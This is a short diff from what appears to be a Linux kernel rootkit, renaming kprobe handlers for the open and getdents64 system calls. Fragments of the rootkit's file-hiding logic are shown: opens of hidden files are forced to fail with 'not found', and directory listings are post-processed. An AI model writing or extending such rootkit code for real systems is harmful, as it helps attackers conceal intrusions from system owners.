@@ -37,7 +37,8 @@ bool is_hidden_file(const char *str) {
 
 #define PATH_BUFFER_SIZE 1024
 
-void open_enter_handler(char *__user filename, struct rootkit_cmd *cmd) {
+void sys_open_kprobe_enter_handler(char *__user filename,
+                                   struct rootkit_cmd *cmd) {
   cmd->data.open_data.should_fail = false;
 
   char buf[PATH_BUFFER_SIZE];
@@ -51,14 +52,15 @@ void open_enter_handler(char *__user filename, struct rootkit_cmd *cmd) {
   }
 }
 
-void open_exit_handler(struct pt_regs *syscall_regs, struct rootkit_cmd cmd) {
+void sys_open_kprobe_exit_handler(struct pt_regs *syscall_regs,
+                                  struct rootkit_cmd cmd) {
   if (cmd.data.open_data.should_fail) {
     syscall_regs->ax = -2;
   }
 }
 
-void getdents64_exit_handler(struct pt_regs *regs,
-                             struct rootkit_cmd syscall_metadata) {
+void sys_getdents64_kprobe_exit_handler(struct pt_regs *regs,
+                                        struct rootkit_cmd syscall_metadata) {
 
   int nread = *(int *)&regs->ax;
 
